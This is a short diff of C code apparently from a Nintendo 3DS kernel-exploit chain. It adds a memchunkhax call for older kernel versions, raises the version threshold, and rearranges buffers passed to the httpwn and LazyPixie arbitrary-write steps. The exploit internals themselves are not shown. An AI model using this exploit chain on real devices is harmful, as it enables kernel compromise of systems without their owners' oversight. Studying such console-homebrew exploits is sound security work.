@@ -5,6 +5,7 @@
 #include "lib/gsp.h"
 #include "httpwn.h"
 #include "lazy_pixie.h"
+#include "memchunkhax.h"
 
 #include "kernelhaxcode_3ds_bin.h"
 
@@ -19,8 +20,7 @@ s32 kernPatch(void)
 
 
 typedef struct ExploitChainLayout {
-    u8 workBuf[0x1000];
-    u8 hole[0x1000];
+    u8 workBuf[0x10000];
     BlobLayout blobLayout;
 } ExploitChainLayout;
 
@@ -41,14 +41,14 @@ static Result doExploitChain(ExploitChainLayout *layout, Handle gspHandle)
     TRY(GSPGPU_FlushDataCache(gspHandle, &layout->blobLayout, sizeof(BlobLayout)));
 
     u8 kernelMinorVersion = *(vu8 *)0x1FF80062;
-    if (kernelMinorVersion < 35) {
+    if (kernelMinorVersion < 48) {
         // Below 9.3 -- memchunkhax
-        // TODO
+        TRY(memchunkhax(&layout->blobLayout, layout->workBuf, gspHandle));
     } else {
         // Above 9.3 -- pwn http (target TLS addresses are hard to guess below 4.x) and use LazyPixie
         baseSbufId = 4; // needs to be >= 4
         numSbufs = lazyPixiePrepareStaticBufferDescriptors(sbufs, baseSbufId);
-        TRY(httpwn(&handle, baseSbufId, layout->workBuf, layout->hole, sbufs, numSbufs, gspHandle));
+        TRY(httpwn(&handle, baseSbufId, layout->workBuf + 0x1000, layout->workBuf, sbufs, numSbufs, gspHandle));
         TRY(lazyPixieTriggerArbwrite(&layout->blobLayout, handle, baseSbufId));
     }
 
